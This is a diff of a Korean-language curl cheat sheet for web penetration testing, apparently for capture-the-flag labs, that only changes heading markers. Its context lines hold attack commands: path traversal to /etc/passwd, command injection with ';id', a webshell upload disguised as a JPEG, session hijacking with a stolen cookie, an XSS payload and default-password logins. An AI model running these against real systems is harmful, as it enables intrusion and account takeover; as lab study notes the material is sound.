@@ -95,7 +95,7 @@ curl "http://target.com/page.php?file=..../etc/passwd"
 curl "http://target.com/ping.php?host=127.0.0.1;id"
 ```
 
-# 파일 업로드 취약점 (확장자 우회)
+## 파일 업로드 취약점 (확장자 우회)
 
 curl -X POST -F "file=@webshell.php;filename=image.jpg;type=image/jpeg" http://target.com/upload
 curl -F "file=@/경로/파일명" http://타겟IP/upload.php
@@ -106,45 +106,45 @@ curl -F "file=@/경로/파일명" http://타겟IP/upload.php
 ### 인증 우회 및 세션 작업
 
 ```bash
-# CSRF 토큰 추출 후 사용
+## CSRF 토큰 추출 후 사용
 TOKEN=$(curl -s -c cookie.txt http://target.com/form | grep -o 'csrf_token" value="[^"]*' | cut -d'"' -f3)
 curl -b cookie.txt -d "csrf_token=$TOKEN&username=admin&password=password" http://target.com/login
 
-# 쿠키 조작으로 세션 하이재킹
+## 쿠키 조작으로 세션 하이재킹
 curl -b "sessionid=STOLEN_SESSION_VALUE" http://target.com/admin
 
-# HTTP 기본 인증 테스트
+## HTTP 기본 인증 테스트
 curl -u admin:password http://target.com/admin
 ````
 
 ### 유용한 도구 조합
 
 ```bash
-# URL 인코딩 (Python 활용)
+## URL 인코딩 (Python 활용)
 curl "http://target.com/search?q=$(python3 -c "import urllib.parse; print(urllib.parse.quote('<script>alert(1)</script>'))")"
 
-# Base64 인코딩 헤더 사용 (Basic Auth)
+## Base64 인코딩 헤더 사용 (Basic Auth)
 curl -H "Authorization: Basic $(echo -n 'admin:password' | base64)" http://target.com
 
-# 404 오류 페이지 숨기기
+## 404 오류 페이지 숨기기
 curl -f http://target.com/admin || echo "페이지 없음"
 
-# 응답에서 특정 정보 필터링
+## 응답에서 특정 정보 필터링
 curl -s http://target.com | grep "flag"
 ```
 
 ### 실전 로그인 및 세션 유지 예시
 
 ```bash
-# 로그인하여 세션 쿠키 저장
+## 로그인하여 세션 쿠키 저장
 curl -c cookie.txt -X POST http://lookup.thm/login.php -d 'username=admin&password=password123' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8'
 
-# 저장된 쿠키로 인증된 페이지 접근
+## 저장된 쿠키로 인증된 페이지 접근
 curl -b cookie.txt http://lookup.thm/dashboard.php
 
 #파일 다운로드
 wget http://www.smol.thm:8080/wordpress.old.zip
-# wget 없을 때 파일 다운로드
+## wget 없을 때 파일 다운로드
 curl -O http://smol.thm:8080/wordpress.old.zip
 ```
 
